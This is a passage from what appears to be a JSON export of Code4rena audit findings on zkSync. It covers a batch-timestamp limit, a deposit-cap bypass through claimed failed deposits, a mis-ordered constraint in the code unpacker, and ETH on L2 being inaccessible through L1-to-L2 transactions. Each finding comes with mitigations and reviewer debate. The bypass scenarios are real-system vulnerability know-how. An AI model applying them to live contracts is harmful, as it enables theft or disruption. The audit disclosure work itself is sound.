COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1`. This batch includes a block with a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1` and a fictive block with a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`. Importantly, these values adhere to all the timestamp requirements outlined in the `SystemContext` contract, as explained earlier.\n\nWhen this batch 1000, is committed on L1 at a specific time `blockTimestamp1000` (meaning the time at which the batch 1000 is committed on L1), during timestamp verification, the following requirement is met (assuming `X <= blockTimestamp1000`):\n\n    require(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, \"h2\");\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>\n\nBecause:\n\n    assuming: X <= blockTimestamp1000 ==>\n    X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA <= blockTimestamp1000 + COMMIT_TIMESTAMP_APPROXIMATION_DELTA\n\nThis results in a successful proof and execution of the batch 1000. Now, when a new batch, 1001, is to be created on L2, its timestamp must be higher than `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA` because a batch's timestamp should surpass the timestamp of the last block in the previous batch.\n\nSuppose the timestamp of batch 1001 is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`, and the last block within this batch carries a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K`.\n\nTo summarize:\n- Batch 1000:\n    - Batch timestamp: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1`.\n    - Timestamp of the last block (fictive block) in this batch: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`.\n    - The time this batch is committed on L1: `blockTimestamp1000`.\n    - `X <= blockTimestamp1000`.\n\n- Batch 1001:\n    - Batch timestamp: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`.\n    - Timestamp of the last block (fictive block) in this batch: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K`.\n    - The time this batch is committed on L1: `blockTimestamp1001`.\n\nDuring the timestamp verification of batch 1001 on L1, to meet the requirement:\n\n    require(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, \"h2\");\n\nWe must have:\n\n    X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K <= blockTimestamp1001 + COMMIT_TIMESTAMP_APPROXIMATION_DELTA\n\nSimplifying the condition yields:\n\n    Y + K <= blockTimestamp1001 - X\n\nHere, `X` represents the time set by the operator, where `X <= blockTimestamp1000` as explained earlier. In the worst case scenario, if `X = blockTimestamp1000`, the condition becomes:\n\n    Y + K <= blockTimestamp1001 - blockTimestamp1000\n\nThe variable `Y` signifies the amount of time required for the timestamp of batch 1001 to be higher than the timestamp of the last block in batch 1000. The minimum value of `Y` is 1 second. Assuming it is equal to 1 second (please note that if `Y` is higher than 1, the situation becomes even worse), the condition simplifies to:\n\n    K <= blockTimestamp1001 - blockTimestamp1000 - 1\n\nThis condition imposes a critical limitation on the number of blocks that can be included in a batch. As a reminder, the timestamp of the first block in batch 1001 is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`, while the timestamp of the last block in this batch is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K` (the fictive block). The difference between these two timestamps equals `K`, and since each block's timestamp must be greater than the previous block, `K` defines the maximum number of blocks allowed in a batch.\n\nThis condition has several implications:\n\n- If both batches 1001 and 1000 are to be committed on L1 at the same time `blockTimestamp1000  = blockTimestamp1001` (in the same Ethereum block), it is not allowed, as `K <= -1`.\n- Examining zkSync Era Explorer, it is evident that batches are frequently committed in the same Ethereum block. For example, by observing Ethereum block number 18383261, the function `commitBlocks` is called 19 times, with block positions ranging from 0 to 18. The following two transactions show just the first and the last `commitBlocks` in this Ethereum block.\n\n<https://etherscan.io/tx/0xbfec43599bb73af95eaf4ac9ff83a62cdbe084382dd6f5d12bc8e817ce3574e5><br>\n<https://etherscan.io/tx/0x1826d459ce7f2ab233374595569a13c4098e8e1eeb26517a98e42d9b5aab7374>\n\n- The explorer demonstrates that the interval between committing batches is relatively short. For instance, if the interval is 30 seconds, a maximum of 29 blocks can be included in a batch.\n\n- It's important to emphasize that batch 1000 has already undergone commitment, proof, and execution processes, and once these steps are completed, they are irreversible. Therefore, this issue will persist within the system.\n\n- As mentioned in the document, L2 blocks are employed to reduce the time required for soft confirmation. However, due to the vulnerability explained earlier, there exists a stringent constraint on the number of blocks, resulting in an extended soft confirmation duration.\n\n> L2 blocks were created for fast soft confirmation on wallets and block explorer. For example, MetaMask shows transactions as confirmed only after the block in which transaction execution was mined. So if the user needs to wait for the batch confirmation it would take at least minutes (for soft confirmation) and hours for full confirmation which is very bad UX. But API could return soft confirmation much earlier through L2 blocks.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#motivation>\n\nOne potential solution is to commit batches on L1 with a longer delay to allow for more blocks to be included in batches. However, this approach may lead to other issues, such as an increased number of pending transactions and significantly extended finality.\n\nAddressing this issue is not straightforward, and it would necessitate an upgrade of the `Executor` facet and a redesign of the timestamp verification process.\n\nIn summary, if the operator sets the timestamp of a batch too far into the future while still complying with L1 requirements, it can restrict the number of blocks that can be included in batches, resulting in a variety of challenges.\n\n### Recommended Mitigation Steps\n\nIt is recommended that a more stricter timestamp constraint currently enforced in the `_verifyBatchTimestamp` function on L1 to also apply on L2. This will help prevent the creation and submission of batches with timestamps set in the distant future to L1. \n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>\n\n### Assessed type\n\nContext\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1826735946)**\n\n**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837474089):**\n>  If the timestamp of a batch is set to its maximum valid value (which is `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`, in this case, `block.timestamp + 365 days`), it results in limitations on the speed of blocks and batches creation. Given that `L2_TX_MAX_GAS_LIMIT` is [equal](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/SystemConfig.json#L2) to `80,000,000`, and the maximum computation gas per batch is equal to `2^32` (explained [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#system-wide-constants) and set [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L37)), roughly 53 transactions (calculated as `2^32 / 80,000,000`), each consuming the maximum `80,000,000` gas, will exhaust the gas capacity of a batch.\n> \n> Consequently, the batch must be sealed, and another batch needs to be created to include additional transactions. If there is a high volume of transactions on the network, numerous batches must be created and committed on L1. Since the timestamp of the batch is set to the current timestamp plus 365 days, committing batches in a single L1 transaction becomes impossible. This is due to each batch's timestamp needing to be higher than the previous batch's timestamp, requiring the validator to wait between each batch commitment for the timestamp on L1 to elapse, thus passing this [check](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94). This scenario can lead to several issues:\n> \n> - Firstly, as indicated in the documentation, the value of `2^32` is arbitrary to prevent the state keeper from taking too much time. \n>   > The maximum number of computation gas per batch. This is the maximal number of gas that can be spent within a batch. This constant is rather arbitrary and is needed to prevent transactions from taking too much time from the state keeper. It can not be larger than the hard limit of `2^32` of gas for VM.\n> \n>   The operator may also seal the batch earlier, as mentioned [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3806). While this speeds up batch commitment on L1, the timestamp of the batch being set to the far future necessitates a delay between each commitment for the timestamp on L1 to elapse.\n> \n> - Secondly, the assumption so far was that each batch consists of one block containing all transactions. However, the primary objective of having multiple blocks in a batch is to enhance the speed of soft confirmation, as explained [here](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/Batches%20%26%20L2%20blocks%20on%20zkSync.md#motivation):\n>   > L2 blocks were created for fast soft confirmation on wallets and block explorer. For example, MetaMask shows transactions as confirmed only after the block in which transaction execution was mined. So if the user needs to wait for the batch confirmation it would take at least minutes (for soft confirmation) and hours for full confirmation which is very bad UX. But API could return soft confirmation much earlier through L2 blocks.\n> \n>   If the operator includes multiple blocks in a batch, it becomes limited on the L1 side during timestamp verification. Suppose batch 100 has a timestamp of `timestamp of the to-be-committed batch 100 + 365 days` and has 20 blocks. The 20th block must have a timestamp of at least `timestamp of the to-be-committed batch 100 + 365 days + 20 seconds`. When the validator commits this batch, it will be reverted [here](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94) because `block.timestamp + 365 days + 20 seconds > block.timestamp + 365 days`. This indicates that having multiple blocks in a batch while the timestamp of the batch is set to the far future (to the edge of acceptable timestamp) will limit the frequency of batch commitment on L1 and restrict the number of blocks in a batch. In such a case, the validator should wait between each batch commitment on L1, potentially causing slow finality, impacting third parties dependent on that.\n> \n> **Summary:**\n> \n> Setting the timestamp of a batch to the far future will limit the speed of blocks and batches creation:\n> - Including multiple blocks in a batch will be restricted during timestamp verification on L1 since the timestamp of the batch is already at the edge of the accepted timestamp.\n> - Having only one block in a batch (to bypass the limitation mentioned above) contradicts the goal of having a block for fast finality.\n> \n> Furthermore, in the case of a high volume of transactions on the network, this issue will be a significant limiting factor. If such a batch with a timestamp in the far future is executed, this limitation will persist in the protocol, as an executed batch cannot be reverted.\n\n\n**[unforgiven (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837501912):**\n> I want to add that the underlying cause of Issue #316 is a security check that restricts the operator to submitting batches with timestamp far in the future(`ZKbatch.timestamp < Etherem.timestamp + DELTA`). This issue persists regardless of the DELTA value, even if set to zero. While this vulnerability exists, there are mitigating factors that diminish its severity:\n> \n> - Due to the 12-second interval between Ethereum blocks, the operator can consistently generate and submit 12 batches within the next Ethereum block. The upper bound for batch timestamps, `Etherem.timestamp + DELTA`, increases by 12 seconds with each Ethereum block.\n> - zkSync can always accommodate approximately 12 batch submissions in each subsequent Ethereum block, even under this attack. Batch timestamps can be set as `Etherem.timestamp + DELTA`, `Etherem.timestamp + DELTA +1`, `Etherem.timestamp + DELTA +2`,... `Etherem.timestamp + DELTA +11` and submitted to Ethereum. These timestamps will pass the `batch.timestamp < Etherem.timestamp + DELTA` check in the next Ethereum blocks due to the 12-second increase in Ethereum's timestamp.\n> - Block numbers are determined by the operator, who can choose to include one block per batch or each transaction in a separate block within a batch. This is an operator-trusted function, and the number of blocks within each batch has no practical impact.\n> - Operators and validators are trusted to submit batches. A malicious operator could simply refrain from submitting batches.\n> \n> In conclusion, the security check `ZKbatch.timestamp < Etherem.timestamp + DELTA` does not impacts the average 12 batch submissions per Ethereum block, even if the operator sets batch timestamps to `Etherem.timestamp + DELTA`.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1838287149):**\n> I agree with anon's comment [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1837474089).\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1848898451):**\n > The finding highlights a way for batch creation to be interrupted, this pertains to any configuration and is something that the operator could do under specific circumstances either willingly or by mistake. \n\n**[vladbochok (zkSync) disputed, disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/316#issuecomment-1838287149):**\n> The issue is highly theoretical and has a low impact in principle.\n>\n> Firstly validator should submit the batch with a timestamp in the future (+365 days). Even the validator is not trusted - this already has a huge impact on L2 protocols (all time-sensitive projects such as DeFi or oracles).\n> \n> And then the only impact is that the validator can't commit batches for times of high load. Please note, that the validator can create batches and generate zkp for them, just can't submit `commitBatches` transaction by that moment. So, the validator can wait for a couple of minutes and then submit all batches. Moreover, currently, there is a delay between batch commits and batch execution by 21 hours. Due to this delay minutes in commits don't affect the time of execution, not saying that proof generation takes minutes, and sequencing in such a high load is questionable.\n\n***\n\n",
      "summary": "\nThis bug report discusses the limitations of timestamp differences and batch creation in zkSync, a platform for processing transactions. These constraints can lead to smaller batch sizes, making it difficult to efficiently process transactions and can also cause bottlenecks and delays in high transaction volumes. The report also mentions that these limitations can be exploited by the operator, leading to operational issues. The report explains the technical details of how these constraints are enforced and how they can impact the system. It also suggests a potential solution to mitigate this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/316",
      "tags": [],
      "finders": [
        "anon"
      ]
    },
    {
      "id": "30290",
      "title": "[M-11] Vulnerabilities in Deposit Limit Enforcement and the Impact on Failed Deposits",
      "impact": "MEDIUM",
      "content": "\n1. **Users Failed Deposits:** If a token has no deposit limitation initially and a user's deposit transaction fails, they may not be able to claim their failed deposits later if a deposit limit is imposed on that token.\n\n2. **Deposit Limit Bypass:** Malicious users can exploit the deposit limit system by making failed deposits before the deposit limit is introduced. By claiming these failed deposits, they can reset their total deposited amount, allowing them to exceed the deposit cap once it is enforced.\n\n### Proof of Concept\n\nWhen depositing an ERC20 token into the `L1ERC20Bridge`, the `_verifyDepositLimit` function plays a pivotal role. This function's primary purpose is to ascertain whether there is a predefined deposit limit in place for the given token and, if such a cap exists, to determine if the user's cumulative deposit amount surpasses this imposed restriction. The user's total deposited amount is meticulously tracked and maintained using the `totalDepositedAmountPerUser` mapping.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L188><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L348>\n\nThis same mechanism is applied when a user seeks to reclaim their failed deposit. In this scenario, the `claimFailedDeposit` function is invoked, which once again triggers the `_verifyDepositLimit` function. However, in this context, the objective is to adjust the `totalDepositedAmountPerUser` mapping by decreasing the total deposited amount due to the claiming failed transaction.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L278><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L345>\n\nThis implementation can give rise to significant issues, which can be illustrated through the following scenarios:\n\n**Scenario 1:** Suppose there's no deposit limitation imposed on tokenX, indicated by `limitData.depositLimitation = false`. Alice (an honest user) initiates a deposit of 100 tokenX. However, these deposits unfortunately fail. At a later point, the owner decides to enforce a deposit limit on this token by employing the `setDepositLimit` function within the `AllowList` contract. Now, Alice seeks to claim her previously failed deposits. However, when the `_verifyDepositLimit` function is invoked during this process, the if-condition is met. Yet, the issue arises when the amount 100 is going to be deducted from `totalDepositedAmountPerUser[tokenX][Alice]` (which equals 0). This results in an underflow, causing the transaction to revert. So, Alice can not claim her failed deposit in this scenario.\n\nIn summary, if there was no deposit limit set for a token initially, and users experienced failed deposit transactions for that token, they encounter difficulties in claiming those failed deposits when a deposit limit is subsequently enforced.\n\n**Scenario 2:** Consider a scenario in which there's no deposit limitation for tokenY initially. However, Bob (a malicious user) monitors the owner's transaction that is going to set a deposit limit for tokenY, specifying `tokenDeposit[tokenY].depositCap = 100`. Immediately, Bob deposits 100 tokenY three times, a total of 300 tokenY, deliberately ensuring that these transactions fail on L2 due to a low `_l2TxGasLimit`. Subsequently, the owner's transaction to establish a deposit limit of 100 for tokenY is executed. Now, Bob decides to deposit another 100 tokenY, resulting in `totalDepositedAmountPerUser[tokenY][Bob]` being set to 100.\n\nHowever, Bob intends to deposit another 100 tokenY. As the condition `require(totalDepositedAmountPerUser[_l1Token][_depositor] + _amount <= limitData.depositCap, \"d1\");` is examined, this requirement stipulates that `totalDepositedAmountPerUser[tokenY][Bob] + 100` must not exceed the deposit cap of 100. Bob's attempt to deposit an additional 100 tokenY is therefore denied.\n\nNonetheless, Bob realizes he can exploit a potential vulnerability. He decides to claim one of his three failed transactions that occurred prior to the deposit cap set up. As a result, `totalDepositedAmountPerUser[tokenY][Bob]` decreases by 100, effectively resetting it to 0. Now Bob can once again deposit 100 tokenY, despite having previously reached the imposed deposit limit. Bob continues this process, claiming his failed deposits after each attempt, thus resetting `totalDepositedAmountPerUser[tokenY][Bob]` and allowing him to deposit 400 tokenY, exceeding the deposit limit of 100.\n\nIn summary, this implementation opens the door for malicious users to circumvent deposit limits by arranging failed deposits prior to the imposition of such limits. Subsequently, by claiming these failed deposits, they can effectively increase their deposit limit by resetting `totalDepositedAmountPerUser`.\n\n### Recommended Mitigation Steps\n\nThe function `_verifyDepositLimit` should be revised such that it tracks the deposited amount of users even if there is no deposit limitation in place.\n\n    function _verifyDepositLimit(address _l1Token, address _depositor, uint256 _amount, bool _claiming) internal {\n            IAllowList.Deposit memory limitData = IAllowList(allowList).getTokenDepositLimitData(_l1Token);\n\n            if (_claiming) {\n                totalDepositedAmountPerUser[_l1Token][_depositor] -= _amount;\n            } else {\n                totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;\n    \t    if(limitData.depositLimitation){\n                   require(totalDepositedAmountPerUser[_l1Token][_depositor] <= limitData.depositCap, \"d1\");\n                }\t\n            }\n        }\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L275>\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/425#issuecomment-1794512366):**\n > This is an issue if we switch the deposit limitation feature on/off. But, this is not going to happen as the deposit limitation is only active temporarily during alpha version, later it will be deactivated (removed fully). So, medium severity is fair.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/425#issuecomment-1826049260):**\n > Primary because, while other findings have a Coded POC, this one captures an additional risk.\n\n***\n\n",
      "summary": "\nThis bug report discusses two potential issues with the deposit limit system in the L1ERC20Bridge contract. The first issue is that if a user's deposit transaction fails and a deposit limit is later imposed on that token, they may not be able to claim their failed deposits. The second issue is that malicious users can exploit the system by making failed deposits before the deposit limit is introduced and then claiming those failed deposits to reset their total deposited amount, allowing them to exceed the deposit cap once it is enforced. The report also includes a proof of concept and recommended mitigation steps to address these issues. The severity of the bug is assessed as medium, as it may only be a problem if the deposit limitation feature is switched on and off, which is not expected to happen. However, it is still important to address these issues to prevent potential risks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/425",
      "tags": [],
      "finders": [
        "J4de",
        "ladboy233",
        "brgltd",
        "tsvetanovv",
        "Mohandes",
        "peanuts",
        "anon",
        "AkshaySrivastav",
        "shealtielanz",
        "cccz",
        "Koolex",
        "Aymen0909",
        "0xsomeone",
        "zzzitron",
        "bin2chen",
        "1",
        "2",
        "max10afternoon",
        "rvierdiiev"
      ]
    },
    {
      "id": "30289",
      "title": "[M-10] Version hash is not correctly enforced in code unpacker",
      "impact": "MEDIUM",
      "content": "\nIn code unpacker, version hash is not correctly enforced.\n\n### Proof of Concept\n\nIn code unpacker, we enforce that version hash is correct.\n\n        let version_hash_matches = UInt16::equals(cs, &chunks[1], &versioned_hash_top_16_bits);\n        state.state_get_from_queue.conditionally_enforce_true(cs, version_hash_matches);\n\nThe second line means, if version hash matches, `state_get_from_queue` must be true. But this is not what we want. The logic should be if we are getting from queue, version hash must match. Otherwise, even if version hash is incorrect, this line passes as no constraint is actually enforced.\n\nLet's take a closer look at fn `conditionally_enforce_true`, bool `should_enforce` is the third parameter.\n\n    pub fn conditionally_enforce_true<CS: ConstraintSystem<F>>(\n        &self,\n        cs: &mut CS,\n        should_enforce: Self,\n    ) {\n        // this is equal to having !self && should_enforce == false;\n        // so (1 - self) * should_enforce == 0\n\n        if cs.gate_is_allowed::<FmaGateInBaseFieldWithoutConstant<F>>() {\n            let zero_var = cs.allocate_constant(F::ZERO);\n\n            let gate = FmaGateInBaseFieldWithoutConstant {\n                params: FmaGateInBaseWithoutConstantParams {\n                    coeff_for_quadtaric_part: F::MINUS_ONE,\n                    linear_term_coeff: F::ONE,\n                },\n                quadratic_part: (self.variable, should_enforce.variable),\n                linear_part: should_enforce.variable,\n                rhs_part: zero_var,\n            };\n\n            gate.add_to_cs(cs);\n        } else {\n            unimplemented!()\n        }\n    }\n\n### Recommended Mitigation Steps\n\n`version_hash_matches.conditionally_enforce_true(cs, state.state_get_from_queue);`\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/716#issuecomment-1795311015)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/716#issuecomment-1826877465):**\n > The Warden has shown how, due to a constant enforcement on version hashes, future hash versions would fail the check.\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the code unpacker that does not correctly enforce the version hash. This means that the code is not properly checking if the version hash is correct, which could lead to incorrect data being processed. The report includes a proof of concept and recommended steps to mitigate the issue. The bug has been confirmed by a member of the development team and a judge has commented on the potential consequences of this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/716",
      "tags": [],
      "finders": [
        "xuwinnie",
        "0xsanson"
      ]
    },
    {
      "id": "30288",
      "title": "[M-09] Lack of access to ETH on L2 through ``L1->L2`` transactions",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L318><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L305-L306><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L2321><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L2328-L2333>\n\n### Description\n\nETH on L2 stored on EOAs is inaccessible through ``L1->L2`` transactions, as for such transactions `msg.value` is generated only \"from L1 ETH\", not from the active balance of the `tx.origin` on L2. This is because of [the logic in the `Malibox::_requestL2Transaction` function](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L305-L306), which enforces `msg.value` of the ``L1->L2`` transaction to be only part of [ETH to be minted inside of transaction processing on L2](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L323). [Bootloader maintains this system invariant](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1656-L1659) as well.\n\n`DefaultAccount` incorrectly [assumes](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L124-L125) that ``L1->L2`` transactions initiated by EOA cover the needed functionality of the `executeTransactionFromOutside` function, so it is empty.\n\nUsers will be unable to access their ETH on L2 in the case of a malicious operator that ignores L2 transactions (so if it processes only ``L1->L2`` transactions). Also, and importantly, this violates the security invariant that enforces the ability of the users to access L2 through ``L1->L2`` transactions, and, therefore, withdraw funds from the rollup before the upgrade in case of a scheduled malicious upgrade.\n\n### Impact\n\nNo access to ETH on L2 that is controlled by EOAs in case of malicious operator.\n\nViolation of the \"guarantee of withdraw of funds before malicious upgrade execution\" security invariant.\n\n### Recommended Mitigation Steps\n\nAdd a possibility to create ``L1->L2`` transactions that can use ETH from the L2 balance as part of the `msg.value`. As an alternative, you can implement the `DefaultAccount::executeTransactionFromOutside` function so it will contain the expected behavior, as [stated in the comment above its declaration](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L122-L129).\n\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1794613549):**\n > Warden states that if an EOA has some fund on L2, he can not withdraw it by requesting a tx from L1. The only way is to make a tx on L2. But, if the operator is malicious and only process L1-to-L2 txs, not L2 txs, then user’s fund will be trapped. \n> \n> The scenario requires a malicious operator ignoring L2 txs. The main issue is that it is not possible to withdraw the fund of an account on L2 through L1 -> L2 transaction. Medium is fair.\n\n**[Barichek (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1838409561):**\n > @Alex the Entreprenerd @vladbochok - The main point of the described finding is about the violation of one of the main zkSync rollup invariants. Namely, the invariant mentioned in the finding is the \"ability of the users to access L2 through `L1->L2` transactions, and, therefore, withdraw funds from the rollup before the upgrade in case of a scheduled malicious upgrade\".\n> \n> This invariant should be maintained in the system design, as `L1->L2` txs are currently the only one legal way to enforce the ability of the user to access his funds in case of the malicious operator. Therefore, it is a critical point that is the only difference between the current zkSync design and the sidechain with transitions proved by zkp.\n> \n> Otherwise, it wouldn't make sense to publish state diffs using on-chain calldata: such data will be required to reconstruct the rollup state and force/process transactions in case of the malicious operator, but in case the operator can ignore L2 transactions and there is no access to ETH on L2 through `L1->L2` txs there is no protection against the malicious operator. This confirms that the described vulnerability is no less serious than the \"ability of the operator to not publish some of the rollup state diffs\" or the \"ability of the operator to ignore `L1->L2` transactions (in the long-term system design with escape hatch)\" (both of which are high-severity findings).\n> \n> Along with the facts that most of TVL of zkSync is native ETH ([link1](https://l2beat.com/scaling/projects/zksync-era#contracts), [link2](https://etherscan.io/address/0x32400084C286CF3E17e7B677ea9583e60a000324)), and custom wallets are not widely adopted on zkSync, most of the value locked in the zkSync fit the described situation.\n\n**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1838596925):**\n > I can confirm that this is a valid submission. That being said by @Barichek, the problem is censorship resistance protection, so user can't escape funds from the rollup using `L1->L2` communication. \n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1849041173):**\n > The Warden has shown how due to a lack of implementation of `executeTransactionFromOutside` a malicious operator could prevent any withdrawal by denying L2 txs.\n> \n> Because of the specific scoping this is valid. Because of the reliance on a malicious operator, Medium Severity seems the most appropriate.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/803).*\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue in the code for the zkSync project. The code in question is responsible for handling transactions between Layer 1 (L1) and Layer 2 (L2) of the project. The bug relates to the handling of ETH stored on L2 by external accounts (EOAs). Currently, the code only allows for a certain amount of ETH to be used for transactions from L1 to L2, and not from the active balance of the EOA on L2. This means that if a malicious operator only processes transactions from L1 to L2, users will be unable to access their ETH on L2. This also violates a security measure that allows users to withdraw their funds from L2 before a scheduled malicious upgrade. The recommended mitigation steps are to either allow for L1 to L2 transactions to use ETH from the L2 balance, or to implement a function that allows for the expected behavior. The severity of this bug has been debated, with some suggesting it is a high severity issue, while others believe it is a medium severity issue due to the reliance on a malicious operator. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/803",
      "tags": [],
      "finders": [
        "Audittens"
      ]
    },
    {
      "id": "30287",
      "title": "[M-08] Burning of the user gas in the `sendCompressedBytecode` function",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1244-L1245><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1255-L1259><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1365>\n\n### Description\n\nIn the `bootloader::sendCompressedBytecode` function the `nearCallPanic()` is used for [the case of unsuccessfull call of the `Compressor::publishCompressedBytecode` function](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1573-L1579). In practice, such situation could happen because of invalid data provided by the operator, as any of the internal checks of this function could be ignored by the operator to make the call to revert: decoding of the `_rawCompressedData` ([link](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L208-L209)), the checks on `dictionary` length 